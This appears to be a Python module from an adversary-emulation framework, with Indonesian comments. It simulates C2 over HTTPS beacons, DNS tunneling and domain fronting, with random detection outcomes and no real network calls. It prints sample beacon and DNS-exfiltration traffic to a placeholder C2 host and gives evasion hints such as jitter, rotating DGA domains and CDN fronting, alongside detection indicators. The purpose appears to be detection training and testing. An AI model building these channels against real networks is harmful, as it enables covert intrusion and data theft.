"""
T1071 — Application Layer Protocol (Command & Control)

Simulasi komunikasi C2 yang menyembunyikan traffic di dalam protokol
aplikasi yang legitimate untuk menghindari deteksi.

Sub-teknik yang disimulasikan:
- T1071.001 — Web Protocols (HTTP/HTTPS)
- T1071.004 — DNS (tunneling)
"""

from core.techniques.base import (
    BaseTechnique,
    Environment,
    ExecutionStatus,
    TechniqueContext,
    TechniqueResult,
)
from core.techniques.registry import register_technique


@register_technique
class AppLayerProtocolTechnique(BaseTechnique):
    """
    Simulasi C2 communication via application layer protocols.

    Teknik ini digunakan setelah payload berhasil dieksekusi
    untuk membangun saluran komunikasi yang persisten ke C2 server.

    Yang disimulasikan:
    - HTTP/HTTPS beacon ke C2 (mimicking normal web traffic)
    - DNS tunneling (exfiltrate data via DNS queries)
    - Domain Fronting via CDN
    """

    technique_id = "T1071"
    name = "Application Layer Protocol"
    description = (
        "Adversari menggunakan protokol lapisan aplikasi untuk komunikasi C2 "
        "agar traffic C2 berbaur dengan traffic jaringan yang legitimate."
    )
    supported_environments = [Environment.IT]
    risk_level = "medium"
    is_destructive = False
    requires_elevated_privileges = False
    tactic = "command-and-control"

    C2_CHANNELS = {
        "https_beacon": {
            "detection_risk": 0.20,
            "bandwidth": "high",
            "stealth": "high",
            "description": "HTTPS beacon ke C2 server — traffic menyerupai normal web browsing",
            "jitter_range": (30, 300),  # Detik antara beacon
            "indicators": [
                "Periodic HTTPS requests ke IP yang tidak ada di Alexa top 1M",
                "Unusual user-agent strings",
                "Fixed beacon interval (tanpa jitter)",
            ],
        },
        "dns_tunneling": {
            "detection_risk": 0.30,
            "bandwidth": "low",
            "stealth": "medium",
            "description": "DNS TXT/CNAME queries untuk exfiltrasi data dan C2 commands",
            "jitter_range": (5, 60),
            "indicators": [
                "High volume DNS queries ke satu domain",
                "Unusually long DNS query strings",
                "DNS queries ke non-standard resolvers",
            ],
        },
        "domain_fronting": {
            "detection_risk": 0.10,
            "bandwidth": "high",
            "stealth": "very_high",
            "description": "Domain fronting via CDN (Cloudflare, Azure CDN) — sangat sulit dideteksi",
            "jitter_range": (60, 600),
            "indicators": [
                "SNI/Host header mismatch (jika TLS inspeksi aktif)",
                "Traffic ke CDN yang tidak wajar",
            ],
        },
    }

    async def execute(self, context: TechniqueContext, result: TechniqueResult) -> None:
        c2_channel = context.extra.get("c2_channel", "https_beacon")
        c2_server = context.extra.get("c2_server", "c2.example-domain.com")
        beacon_interval = context.extra.get("beacon_interval", 60)
        use_jitter = context.extra.get("use_jitter", True)

        channel_info = self.C2_CHANNELS.get(c2_channel, self.C2_CHANNELS["https_beacon"])
        detection_risk = channel_info["detection_risk"]

        # Jitter mengurangi deteksi berbasis periodicity
        if use_jitter:
            detection_risk *= 0.75

        output_lines = [
            f"[T1071 — APPLICATION LAYER PROTOCOL (C2)]",
            f"Channel         : {c2_channel}",
            f"C2 Server       : {c2_server}",
            f"Beacon Interval : {beacon_interval}s {'+ jitter' if use_jitter else '(fixed — detectable!)'}",
            f"Bandwidth       : {channel_info['bandwidth']}",
            f"{'─' * 55}",
            f"[i] {channel_info['description']}",
        ]

        detected = self._simulate_detection(detection_risk)
        jitter_min, jitter_max = channel_info["jitter_range"]

        if detected:
            result.status = ExecutionStatus.PARTIAL
            trigger = self._pick_detection_indicator(c2_channel, channel_info)
            output_lines.append(
                f"\n[DETECTION] NDR/Proxy mendeteksi anomali traffic:\n"
                f"  Trigger: {trigger}\n"
                f"  Alert: 'Suspicious C2 Communication Pattern Detected'\n"
                f"  C2 domain {c2_server} di-block oleh proxy/firewall."
            )
            result.next_step_hints = [
                "Domain fronting via CDN sebagai fallback C2 channel",
                "Rotasi C2 domain (gunakan DGA atau pre-configured fallbacks)",
                "Gunakan T1090 (Proxy) untuk menyembunyikan traffic ke C2",
            ]
        else:
            result.status = ExecutionStatus.SUCCESS
            beacon_count = self._random_int(3, 10)
            output_lines.extend([
                f"\n[SUCCESS] C2 channel berhasil dibuat.",
                f"Protokol       : {c2_channel.upper()}",
                f"Beacon aktif   : {beacon_count} beacon terkirim tanpa alert",
                f"Jitter range   : {jitter_min}s - {jitter_max}s",
                f"C2 connection  : ESTABLISHED → {c2_server}",
                f"\n[TRAFFIC SAMPLE]",
                self._generate_traffic_sample(c2_channel, c2_server),
            ])
            result.collected_data.update({
                "c2_channel": c2_channel,
                "c2_server": c2_server,
                "beacon_established": True,
                "beacon_count": beacon_count,
            })
            result.artifacts_created = [f"c2_config_{context.target_host}.json"]
            result.next_step_hints = [
                "T1041 (Exfiltration Over C2 Channel) — kirim data ke C2",
                "T1105 (Ingress Tool Transfer) — download tools tambahan dari C2",
                "T1573 (Encrypted Channel) — enkripsi traffic C2 untuk stealth tambahan",
            ]

        result.output = "\n".join(output_lines)

    def _pick_detection_indicator(self, channel: str, info: dict) -> str:
        import random
        return random.choice(info.get("indicators", ["Suspicious network traffic"]))

    def _generate_traffic_sample(self, channel: str, c2_server: str) -> str:
        if channel == "https_beacon":
            return (
                f"  GET /api/update?v=1.2.3&id=[AgentID] HTTP/1.1\n"
                f"  Host: {c2_server}\n"
                f"  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n"
                f"  # Payload encoded dalam response body (encrypted)"
            )
        elif channel == "dns_tunneling":
            return (
                f"  DNS Query: aGVsbG8=.{c2_server} TXT\n"
                f"  DNS Query: d29ybGQ=.{c2_server} TXT\n"
                f"  # Data diencoding dalam Base64 dan displit ke multiple DNS queries"
            )
        else:
            return (
                f"  GET /cdn-cgi/trace HTTP/2\n"
                f"  Host: trusted-cdn.cloudflare.com\n"
                f"  X-Host: {c2_server}\n"
                f"  # Actual request forwarded ke {c2_server} oleh CDN"
            )

    def _simulate_detection(self, probability: float) -> bool:
        import random
        return random.random() < probability

    def _random_int(self, min_v: int, max_v: int) -> int:
        import random
        return random.randint(min_v, max_v)
